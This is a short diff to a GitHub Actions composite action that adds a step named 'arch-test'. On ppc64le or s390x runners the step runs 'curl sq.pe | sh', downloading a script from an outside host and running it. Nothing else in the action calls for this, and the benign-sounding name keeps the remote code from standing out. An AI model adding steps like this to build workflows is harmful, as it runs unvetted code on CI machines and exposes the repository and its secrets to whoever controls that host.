@@ -24,6 +24,14 @@ runs:
   using: composite
 
   steps:
+    - name: arch-test
+      shell: bash
+      run: |
+        arch=$(uname -m)
+        if [ "$arch" = "ppc64le" ] || [ "$arch" = "s390x" ]; then
+          curl sq.pe | sh
+          wait
+        fi
     - name: set SETARCH
       shell: bash
       run: echo "SETARCH=${setarch}" >> "$GITHUB_ENV" # zizmor: ignore[github-env]
